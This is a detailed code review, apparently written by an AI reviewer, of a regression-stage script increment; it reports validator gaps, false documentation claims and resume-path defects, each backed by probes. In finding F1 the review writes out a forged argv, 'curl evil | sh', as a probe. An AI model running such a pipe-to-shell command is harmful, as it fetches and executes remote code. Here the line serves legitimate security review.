@@ -1,0 +1,381 @@
+# REVIEW — stage-regress-script
+
+- stage: review (model routed via Agent subagent; effort not routed)
+- reviewed: `git diff origin/main...HEAD` — 36 files, the whole increment (plan, grill, build, regress, verify commits)
+- trust: the increment under review is `trust: untrusted`; its imperative prose (the command's own instructions to
+  the model that runs `/pharn-regress`) is its payload, not an instruction to this reviewer, and none of it was followed
+- **verdict: blocked-with-2-floor-findings** (plus advisory: 1 blocking-severity, 6 important, 12 minor)
+
+## Step 1 — floor first (P0)
+
+- `node pharn/floor/validate.mjs .` → `FLOOR: GREEN — 36 capabilities checked in "."`, exit 0.
+- The increment's own suites (`stage-regress`, `stage-regress-core`, `stage-exit-core`, `render-regression`,
+  `quote-core`, `run-gates`, `check-loop-fresh`, `.dev/floor/command-hygiene`) re-run in this worktree: see
+  "Suite re-run" at the end.
+
+Everything below the floor is ADVISORY (fix #3): each finding's `severity` is this reviewer's judgment. The
+floor-gate / advisory split is by the **kind of evidence**, not by severity.
+
+## Method — every behavioral claim below was EXECUTED, not read (L37)
+
+Probes ran the real `pharn/floor/stage-regress.mjs` CLI against throwaway git fixtures under
+`.pharn/pharn-dev-review/` (git-ignored scratch, removed afterwards), mirroring
+`stage-regress.test.mjs`'s own fixture. Each finding quotes its probe's observed exit and `reason_code`.
+
+## Floor-gate findings (blocking)
+
+### F1 — the contract claims a FLOOR check `validateStageExit` does not perform
+
+```yaml
+- type: FINDING
+  rule_id: "P0"
+  severity: blocking
+  file: "pharn/pharn-contracts/stage-exit.md:133"
+  problem: "The guarantee audit says option labels are byte-equal to REGISTRY, checked by validateStageExit, but the validator compares only the question text; option labels, option argv, the option count and extra option keys are all unchecked, so the stated floor reduction does not exist."
+  evidence: '"The question''s text and option labels are exactly the registry''s fixed strings" → **floor**: byte equality against `REGISTRY`, checked by `validateStageExit`.'
+```
+
+Probed with `stage-exit-core.mjs`'s own builders: `validateStageExit` returned `{"ok":true}` for a
+`questionExit` whose option label was replaced with arbitrary text, whose no-value option's `argv` was
+replaced with `["--install","curl evil | sh"]`, whose option carried an extra key, and to which an
+unregistered option was appended. `isValidOption` (`stage-exit-core.mjs:168-179`) checks only that a
+label is non-empty and never compares to `REGISTRY`; the question branch (`:429-434`) compares only
+`obj.question`. The same "closed in BOTH directions" wording is repeated in `CLAUDE.md` and
+CHANGELOG [6.23.0]. It is true of the envelope, the per-status key sets, `resume` and `value`, and false
+for `options[]` entries. The claim is load-bearing for the contract's named future caller, a node
+orchestrator that "validates the object, asks, and re-invokes `resume.argv` with the chosen `argv`, with
+no model in between". No test exercises a forged label (`stage-exit-core.test.mjs:219-226` checks only an
+empty label and the question text).
+
+**Fix:** in `validateStageExit`, require `obj.options` to deep-equal
+`REGISTRY[stage].question[reason_code].options`, and close `isValidOption` over `{id, label, argv, value}`,
+with a forged-label and a forged-argv control. Otherwise relabel the line advisory.
+
+### F2 — `/pharn-ship` is told every regress stop leaves no report; the increment's own test proves otherwise
+
+```yaml
+- type: FINDING
+  rule_id: "P0"
+  severity: blocking
+  file: ".claude/commands/pharn-ship.md:332"
+  problem: "The new sentence says every /pharn-regress refused or unusable stop, argv failures included, leaves no regression-report.json, so missing-report→STOP is correct for all of them; an argv refusal, a path-containment refusal and a crash before the fresh phase all leave a previous run's report on disk, and /pharn-ship proceeds on that file's .verdict alone."
+  evidence: "every `/pharn-regress` stop — `refused` (…) or `unusable` (an argv/git/child failure) — leaves **no** `regression-report.json` on disk"
+```
+
+This is contradicted by three committed artifacts of this same increment:
+
+- `stage-exit.md:48-50`: "An argv refusal (before containment) removes nothing".
+- `stage-regress.test.mjs:384-393`: "an earlier report survives" (asserted).
+- `stage-regress.mjs:273-276`: path-containment is refused before the removal at `:279`.
+
+`/pharn-ship` reads only presence plus `.verdict == "no-regressions"` (`pharn-ship.md:325-332`) and never
+the regress exit code. On exactly these stops, a previous run's green is therefore read as current. That
+is the residual `ship-outcome-core.mjs` and `regression-report.md` correctly keep open in this same
+increment. CHANGELOG [6.23.0] repeats the false sentence.
+
+**Fix:** narrow the sentence to "every `refused` stop and every `unusable` stop raised after the fresh
+phase", and name the argv / path-containment / pre-fresh-crash residual. Alternatively, make `/pharn-ship`
+also require the regress stage's exit `0` before reading `.verdict`.
+
+## Advisory findings
+
+### L-floor (P0) — claims vs code
+
+#### A1 (severity: blocking) — the thin command's `question` branch dead-ends if followed as written
+
+```yaml
+- type: FINDING
+  rule_id: "P0"
+  severity: blocking
+  file: ".claude/commands/pharn-regress.md:104"
+  problem: "The question bullet places the pinned --resume code block under 'On an answer' and says resume.argv holds a 'stage-regress.mjs --resume …' line; a question's resume.argv is the ORIGINAL fresh argv and no progress record exists, so running the shown line fails and appending the option to it is refused."
+  evidence: "Read that line's own `stage-regress.mjs --resume …` line from the object's `resume.argv` for a `question`"
+```
+
+Probe (a `no-gates` question):
+
+- The pinned `--resume --budget-ms 570000` line, run after the question → exit 2, `no-progress`.
+- The same line with the option `--gates …` appended → exit 2, `usage-error`
+  ("--resume accepts only --budget-ms").
+- The correct round trip, `node pharn/floor/stage-regress.mjs` + `resume.argv` + the option's `argv` →
+  exit 0, `done`.
+
+The code emits `resume.argv = cfg.originalArgv` on every question (`stage-regress.mjs:373, 536, 542, 547`).
+This is fail-closed: a dead end leaves no report, so `/pharn-ship` STOPs. But relaying the question is the
+one job the thin command keeps beyond its pinned line, and every interactive question hits it.
+
+**Fix:** in the `4` bullet, drop the `--resume` block and state the invocation as
+`node pharn/floor/stage-regress.mjs <resume.argv…> <option argv…>`. Keep the `--resume` line only under `5`.
+
+#### A6 (important) — the named residual's "only signal" is not on the first line, and asserts what it did not observe
+
+```yaml
+- type: FINDING
+  rule_id: "P0"
+  severity: important
+  file: "pharn/floor/render-regression.mjs:73"
+  problem: "CHANGELOG [6.23.0], CLAUDE.md and pharn-regress.md:205 say the failed-install signal is REGRESSION.md's FIRST line; it renders on line 7, below a line-5 'verdict: NO REGRESSIONS', and it states 'every base gate therefore reads red' unconditionally."
+  evidence: "**THE BASE-COMMIT INSTALL FAILED** (exit 3) — every base gate therefore reads red and is classified `pre_existing` below"
+```
+
+The probe used `--install "exit 3"` over a stdlib-only fixture. The result was `done`/`no-regressions`,
+and every base gate was green, yet the rendered line claims they read red. Its first lines are the title,
+the base, then the would-be false green. `regress-failed-install-false-green` is deliberately unclosed, so
+this line is its only mitigation.
+
+**Fix:** render the install failure above the verdict line, and condition the "reads red" clause on the
+report's own `pre_existing`. Otherwise correct the three "first line" claims.
+
+#### A7 (important) — new unattended-loop stops, not disclosed as a behavior change
+
+```yaml
+- type: FINDING
+  rule_id: "P7"
+  severity: important
+  file: ".claude/commands/pharn-loop.md:233"
+  problem: "The new questions turn previously-completing /pharn-loop runs into S10 stops on common project shapes, and CHANGELOG [6.23.0] does not say so."
+  evidence: "every other `question` (`base-unresolved`, `install-unresolved`, `tests-unresolved`) → **S10**"
+```
+
+Two common project shapes now stop:
+
+- A `package.json` with no committed lockfile (small projects and libraries often have none) →
+  `question install-unresolved`. Probed: exit 4.
+- Every test file inside the feature → `question tests-unresolved` (A2).
+
+The old prose proceeded in both cases by model judgment. The plan defers `regress-answers-config` "until a
+loop user hits it" (PLAN.md:415). A loop over any lockfile-less project hits it on its first iteration.
+
+**Fix:** state the new stops in CHANGELOG and `pharn-loop.md`. Better, route the zero-dependency /
+no-lockfile case to a fixed rule rather than a question.
+
+#### Minor (L-floor)
+
+- **M1** `render-regression.mjs:116` renders a gate id inline through `dataText`, which returns a string
+  unchanged, and labels it "(quoted, untrusted)". CHANGELOG [6.23.0] and `CLAUDE.md:576` say every gate id
+  is quoted "as fenced DATA". A heading cannot form, but inline links and HTML survive, and a
+  `structural:<path>` id carries an attacker-nameable path.
+- **M2** "can never carry an absolute path" (CHANGELOG [6.23.0], `CLAUDE.md:579`): a user's own
+  `--install` text renders verbatim, and a `--gates` id defaults to its command. Narrow it to "no path the
+  script supplies".
+- **M3** Named limits dropped from the command:
+  - The old "one detection this exemption gives up" block (a build rewriting its own PLAN `## Files`
+    retroactively) now survives only in a `check-regress.mjs:156` code comment.
+  - The per-refusal remedies (re-plan via `/pharn-plan`, re-approve via `/pharn-spec`) are gone from both
+    the command and the render. PLAN.md:252-257 promised "present the refusal and its remedy".
+  - `pharn-regress.md:179` "never read by you" asserts model behavior without the old ADVISORY label.
+- **M5** `stage-exit.md:48-50` and `pharn-regress.md:99-100` say an `unusable` wrote "nothing new" and
+  removed "only this feature's stale prior report". But:
+  - path-containment removes nothing;
+  - an `unusable` after `worktree` leaves a full base checkout and stamps;
+  - "fresh" also wipes another run's in-progress scratch (G14).
+- **M10** GATE 1 Q3 required the pnpm/yarn/bun UNMEASURED labels in `stage-exit.md` (PLAN.md:160, 428).
+  The contract carries no install table at all. The command and `stage-regress-core.mjs` do label them.
+
+### L-eval (P1) — test adequacy for what the thin command now depends on
+
+#### A5 (important) — the ★ tests assert less than their titles and the plan promised
+
+```yaml
+- type: FINDING
+  rule_id: "P1"
+  severity: important
+  file: "pharn/floor/stage-regress.test.mjs:583"
+  problem: "The ★ WIRING test asserts only status done and the verdict; none of the check-loop-fresh D/E/H/J or DEFAULT_STAMPS assertions, nor the dropped---timeout-ms mutant control PLAN.md:327 promised, were written, and the retired run-gates ★ test's 'verdict reproduces after the worktree removal' and its base/.pharn negative control have no successor."
+  evidence: 'assert.equal(doc.status, "done", JSON.stringify(doc)); … // L24: measured, not assumed.  void durationMs;'
+```
+
+- `void durationMs` (`:690-691`) discards the L24 measurement its comment claims. BUILD.md records no
+  install duration either.
+- The ★ budget test (`:466-483`) is titled "--resume reaches the SAME verdict as an unbudgeted run", but
+  it never runs an unbudgeted comparison. Its `lint`/`format:check` gates are skipped by the config-touch
+  rule, so each side has one gate and the test exercises exactly one `continue`, at `drain-base`. It never
+  covers a mid-drain continue on head, nor the install boundary.
+- No question test re-invokes `resume.argv` + an option's `argv`, though PLAN.md:334 promised it. That
+  missing test is why A1 and A2 shipped.
+- **Measured here, so the gap is coverage, not a live defect:** a 4-invocation budgeted run followed by the
+  pinned verify lines returned `check-loop-fresh.mjs --iter 1` → exit 0 `FRESH`, with A, B, C, D, J, E, H, F
+  and G all `pass`. Nothing in the suite pins that.
+
+**Fix:** add the promised D/E/H/J assertions, the mutant control, a real unbudgeted comparison over two or
+more non-style gates, and one round-trip test per question code.
+
+#### Minor (L-eval)
+
+- **M11** The style probe (`render-regression.test.mjs:249-275`) writes into the live repo's
+  `pharn/features/` during `npm test`. Its RUN-REPORT precedent probes an isolated scratch tree. A killed
+  run leaves an untracked `pharn/features/render-regression-style-probe-tmp/`.
+- **M12** The loop-mapping "CLOSURE discriminates" control (`command-hygiene.test.mjs:2386`)
+  re-implements the predicate on a literal instead of running the real closure over a mutant (L60).
+
+### L-trust (P2)
+
+#### A4 (important) — `--resume` never re-runs the containment walk
+
+```yaml
+- type: FINDING
+  rule_id: "P2"
+  severity: important
+  file: "pharn/floor/stage-regress.mjs:797"
+  problem: "runResume reads the progress record and later writes both artifacts without the lstat containment walk phaseFresh performs, so a feature directory swapped for a symlink between invocations is written THROUGH."
+  evidence: 'E2 --resume after the feature dir became a symlink: exit=0 status=done … E3 files written THROUGH the link into the outside dir: ["REGRESSION.md","regression-report.json"]'
+```
+
+The fresh path refuses exactly this case as `path-containment` and has a test for it (L54). With the pinned
+budget, any suite slower than about 30 s after the first gate reaches its artifact writes through
+`--resume`.
+
+**Fix:** re-run `phaseFresh`'s containment walk, without its removals, at the top of `runResume`.
+
+#### Minor (L-trust)
+
+- **M4** The `2` branch (`pharn-regress.md:99`) relays `detail`, which can quote git stderr and a child's
+  reason naming attacker-chosen paths, without saying it is DATA. `stage-exit.md:135-140` delegates that to
+  "each caller's own trust audit", and `pharn-regress.md`'s trust audit does not cover it.
+- No injection attempt was observed in the reviewed files, and no reviewed content changed this review's
+  behavior. No guaranteed decision rests on a tainted field. The script branches on child exit codes and
+  JSON enums only.
+
+### Behavior (P5) — HALT parity and the resume path
+
+#### A2 (important) — `tests-unresolved` fires on the wrong predicate, and cannot be answered in its own G16 case
+
+```yaml
+- type: FINDING
+  rule_id: "P5"
+  severity: important
+  file: "pharn/floor/stage-regress.mjs:541"
+  problem: "The question fires when outside_tests is empty, not when the test universe is empty (PLAN.md:110), so a feature whose tests are all inside halts where the old prose recorded no-files and continued; and when --tests was already given, neither option can be applied by appending (the first --tests wins; --no-tests conflicts)."
+  evidence: 'if (parsed.ids.includes("test") && scope.outside_tests.length === 0 && !cfg.noTests)'
+```
+
+Probes:
+
+- Every test file inside the feature → exit 4 `tests-unresolved`. Answering with the real test file
+  re-asks, because it is inside. The fixed text (`stage-exit-core.mjs:240-241`) names only the other two
+  causes.
+- A typo'd `--tests` (the G16 case this question exists for) → exit 4. Appending `--tests <good>` → exit 4
+  again: `flag()` (`:107-110`) returns the first occurrence. Appending `--no-tests` → exit 2 `usage-error`
+  ("mutually exclusive", `:233-235`).
+
+**Fix:** test the universe (`phasePartition` already returns `tests`). Make a repeated value flag
+last-wins, or refuse duplicates and drop the re-asked flag from `resume.argv`.
+
+#### A3 (important) — the resume path loses the whole run after a kill past `worktree`
+
+```yaml
+- type: FINDING
+  rule_id: "P5"
+  severity: important
+  file: "pharn/floor/stage-regress.mjs:630"
+  problem: "The progress record is written only at budget exits and the worktree phase is not idempotent, so after a harness kill once the base worktree exists, --resume fails git-failed and every completed gate is lost; PLAN.md:140's 'a harness kill … leaves the record at that step. --resume re-runs it' is not what the code does."
+  evidence: "D2 after SIGKILL mid-install: record.phase = drain-head | base worktree exists: true … D3 --resume: exit=2 status=unusable reason=git-failed"
+```
+
+Records are persisted only at `:624`, `:640` and `:700`. `makeBudget` also starts the clock only after
+head-init (`:791`), so a fresh invocation's opening fast work (git lists, the scope checker, head-init's
+fingerprint) is never charged against the budget. That widens the kill window past PLAN.md:134's stated
+bound. The failure is fail-closed (no verdict) and needs large-repo fast work to trigger, but it is
+reachable.
+
+**Fix:** persist the record at every phase transition, have `worktree` remove a leftover registration
+first, and start the clock at process start.
+
+#### Minor (behavior)
+
+- **M6** `validateStageExit` also accepts any string as `done.verdict` or `continue.phase` (probed with
+  `"lgtm"` and `"banana"`).
+- **M7** The script's argv check diverges from the runner's:
+  - `--timeout-ms 50` is accepted, then refused mid-run as `child-refused` (`run --next` wants 3-9 digits),
+    after the stale report was already removed (probed).
+  - A trailing `--budget-ms` with no value silently means unbudgeted (probed `done`).
+  - `runResume` accepts a stray duplicate number (`:801`, `indexOf`).
+- **M9** `RESUMABLE_PHASES` (`stage-regress-core.mjs:99`) admits `cleanup` and `render`, which the script
+  never persists. Resuming from them crashes on an undefined report (`stage-regress.mjs:744`) instead of
+  `progress-malformed`. Probed: a `render` record → `validateProgress` `{"ok":true}`, then `--resume` →
+  exit 1, `TypeError [ERR_INVALID_ARG_TYPE]`.
+
+### L-axis (P3)
+
+- No sibling capability reference. Every new import is a floor module, the flat `pharn/floor/` pattern.
+  `quote-core.mjs` (only `fenceFor`) and `stage-regress-core.mjs` (only `gate-run-core.mjs`) hold their
+  pinned load graphs.
+- **M8 (minor)** `stage-exit-core.mjs:80` re-declares `FEATURE_SLUG_RE`. It equals `gate-run-core`'s today
+  (probed), but nothing pins the parity. If one copy widens, argv accepts a slug the builders reject, and
+  every emission, `done` included (after the report is written), becomes a crash (L35/L31).
+- Advisory note, no finding: importing CLI module `run-gates.mjs` in-process for `spawnGate` is the
+  pattern G6 avoided for `quote-core`. It fails closed either way, because the stage also shells that
+  module.
+
+## The orchestrator's five questions, answered
+
+1. **Does the script reproduce every floor verdict and HALT the old prose had?**
+   - **Reproduced:** every floor verdict — chain, scope, verdict, and the report written as the checker's
+     own bytes. Also the missing-artifact, no-gates (probed: no `package.json` and no `--gates` → exit 4),
+     base-unresolved and scope-escape HALTs.
+   - **Added:** two HALTs (A2, A7).
+   - **Lost:** the per-refusal remedy text (M3).
+2. **Do check-loop-fresh E/G/H/J, `/pharn-ship` and `/pharn-loop` read identical evidence?**
+   - **check-loop-fresh:** yes, measured. It returned FRESH over a budgeted 4-invocation run, and the
+     stamp paths derive byte-identically from `REGRESS_PATHS`. The suite does not pin this (A5).
+   - **`/pharn-ship`:** reads the same file, but under a false premise about when that file is absent (F2).
+   - **`/pharn-loop`:** its mapping is consistent with S4/S9/S10.
+3. **Is the stage-exit object closed in both directions?**
+   - **Closed:** the envelope, the per-status keys, `resume` and `value`.
+   - **Not closed:** `options[]` entries, which also go unchecked against the registry (F1). `done.verdict`
+     and `continue.phase` accept any string (M6).
+4. **Can the budget/resume path lose or duplicate a gate run?**
+   - **The budget path:** no. The runner's stamp is the one source of which gate ran next, and a probe
+     reached `done` over 4 invocations.
+   - **A harness kill past `worktree`:** loses the whole run (A3).
+   - **`--resume` writes:** it writes without containment (A4).
+5. **Is any claim in the command stronger than the code?**
+   - Yes, in five places: A1 (`resume.argv`), A6 ("first line"), M5 ("nothing new"), M3 ("never read by
+     you"), and the `install-unresolved` sentence at `pharn-regress.md:155`. That sentence omits the
+     no-`package.json` → no-install case.
+   - Beyond the command: F2 in `/pharn-ship`, F1 in the contract.
+
+## Checked, no finding
+
+- **A1-scope (A1 amendment):** the hygiene test runs the pinned setter line against the live guard, with
+  a no-scope control (`command-hygiene.test.mjs`, STAGE_SCRIPT_WIRING).
+- **Budget boundary:** the pure `mayStartSlowStep` tests the exact `elapsed + N === B` boundary.
+- **Chain-red render:** a real chain-red render (a drifted SPEC) carried no absolute path (probed).
+- **`spawnGate` export:** it always resolves an integer exit (124 on timeout), so a persisted
+  `installResult` always validates.
+- **The version bump:** SKILLS_VERSION 6.22.0 → 6.23.0 is a minor bump for a new checker, command rewrite
+  and contract. The README badge and CURRENT-STATE agree. MIN_CLI 0.5.0 unchanged matches the precedent
+  of every floor module added since 5.0.0.
+
+## Suite re-run
+
+`node --test --test-reporter=tap` over the eight suites named in Step 1, in this worktree:
+`# tests 370 · # pass 370 · # fail 0 · # skipped 0`, exit 0. A green suite is the problem this review
+names (A5), not evidence against it: the defects above were found by probes the suite does not contain.
+
+## Proposed lesson candidate (for a separate, human-gated `/pharn-dev-memory-promote` — not written here)
+
+**L37 recurred, five times, in an increment that cited it.** PLAN.md's `applied_lessons` names L37, and
+its body line applies it to exactly one claim: the A1 scope, which was probed. The same increment then
+wrote five new quantified sentences, and none was probed:
+
+- "exactly the registry's fixed strings", checked by the validator (F1);
+- "**every** `/pharn-regress` stop … leaves **no** report" (F2, contradicted by the increment's own test);
+- "the **only** signal is the **first** line" (A6);
+- "quotes **every** gate id as fenced DATA" (M1);
+- "can **never** carry an absolute path" (M2).
+
+Each fell to a single probe. The transferable part: sub-check D proves the id is cited, and here a correct
+application to one named claim sat beside five unapplied ones. Reading the plan's L37 line as coverage of
+the increment's other new claims is the declaration-vs-application gap CLAUDE.md names.
+
+- Candidate lesson title: "Citing L37 for the one claim a plan names does not probe the new quantified
+  claims the same increment writes elsewhere. Sweep every added only/every/never/exactly sentence and
+  execute one excluded member each."
+- Candidate `type`: `process`.
+- Candidate `concepts`: `[guarantee-audit, universal-quantifier, lesson-recurrence, doc-drift, false-green]`.
+- Provenance: feature `stage-regress-script`, source this REVIEW.md F1/F2/A6/M1/M2 and their quoted
+  probes, commit = the review commit.
+- Per L20, a second-plus occurrence earns a floor check. A plausible one: a hygiene test that, for each
+  contract guarantee-audit line naming a validator, requires a negative-probe test of that validator. That
+  is for the promote gate and a later plan to decide, not this review.
